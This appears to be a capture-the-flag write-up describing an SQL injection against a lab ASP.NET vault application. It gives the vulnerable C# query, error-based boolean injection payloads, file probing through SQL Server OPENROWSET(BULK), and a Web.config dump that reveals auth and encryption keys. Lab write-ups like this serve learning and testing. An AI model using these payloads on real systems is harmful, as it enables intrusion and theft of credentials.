1. **Source-code review**
    
      
    
    While reviewing `Controllers/MyController.cs`, the pentester identified the vulnerable query in the `SecondaryEmail()` action:
    
      
    
    C#
    
    ```
    cmd.CommandText = string.Format("SELECT * FROM Users WHERE Email = '{0}' OR SecondaryEmail = '{0}'", secondaryEmail);
    ```
    
    Because the value is concatenated directly into the SQL string and the regex check is bypassable, the endpoint is clearly injectable.
    
      
    
2. **Confirming error-based boolean injection**
    
      
    
    The pentester submitted a payload designed to trigger a divide-by-zero error when the injected condition is true:
    
      
    
    HTTP
    
    ```
    secondaryEmail=asd@me.com'UNION+SELECT+NULL,NULL,NULL,+CASE+WHEN+(1=1)+THEN+1/0+ELSE+NULL+END;--+-
    ```
    
    The server responded with a `Divide by zero error encountered` message, proving the injected SQL was executed and the fourth column was processed.
    
      
    
    To confirm the injection was conditional, the pentester changed the condition to `1=2`:
    
      
    
    HTTP
    
    ```
    secondaryEmail=asd@me.com'UNION+SELECT+NULL,NULL,NULL,+CASE+WHEN+(1=2)+THEN+1/0+ELSE+NULL+END;--+-
    ```
    
    This time the server returned a normal `302 redirect` with no error, showing the condition controlled query behavior.
    
      
    
3. **Extracting internal paths from error messages**
    
      
    
    The error responses revealed the physical path of the application source file:
    
      
    
    Plaintext
    
    ```
    C:\inetpub\wwwroot\vault.royalflush.htb\Controllers\MyController.cs:192
    ```
    
    This confirmed the application was running under IIS in `C:\inetpub\wwwroot\vault.royalflush.htb\`.
    
      
    
4. **Mapping file existence through SQL Server bulk-load errors**
    
      
    
    The pentester used SQL Server's `OPENROWSET(BULK...)` primitive to probe files on disk. Different operating-system error codes in the response distinguished between non-existent paths, existing-but-inaccessible paths, and existing readable files:
    
      
    - **Path does not exist returned:**
        
          
        
        Plaintext
        
        ```
        Cannot bulk load because the file "C:\inetpub\wwwroot\webapp\vault" could not be opened. Operating system error code 3(The system cannot find the path specified.).
        ```
        
    - **Path exists but access denied returned:**
        
          
        
        Plaintext
        
        ```
        Cannot bulk load because the file "C:\inetpub\wwwroot" could not be opened. Operating system error code 5(Access is denied.).
        ```
        
    - **File does not exist returned:**
        
          
        
        Plaintext
        
        ```
        Cannot bulk load. The file "C:\inetpub\wwwroot\vault.royalflush.htb\Web.configs" does not exist or you don't have file access rights.
        ```
        
5. **Locating and dumping Web.config**
    
      
    
    After testing several paths, the pentester confirmed that `C:\inetpub\wwwroot\vault.royalflush.htb\Web.config` existed because the request returned `302 Found` instead of a file-not-found error. Supplying a deliberately wrong filename such as `Web.configs` returned `500` with a clear "does not exist" message, confirming the base file was real.
    
      
    
    The pentester then wrote a script to read the file in chunks through the SQL injection and reassemble its contents. The dumped `Web.config` contained the application's sensitive cryptographic keys:
    
      
    
    XML
    
    ```
    <add key="webpages:Version" value="3.0.0.0" />
    <add key="webpages:Enabled" value="false" />
    <add key="ClientValidationEnabled" value="true" />
    <add key="UnobtrusiveJavaScriptEnabled" value="true" />
    <add key="AuthKey" value="874c2f91-7346-4005-b55d-5077a54a5201" />
    <add key="AuthCookieName" value="user" />
    <add key="PasswordKey" value="f3d9aa53-c08d-43" />
    <add key="PasswordIV" value="5ac8083e-8ff6-43" />
    </appSettings>
    ```
    
    With these keys, an attacker can forge authentication cookies and decrypt stored password values, completing the compromise of the vault application.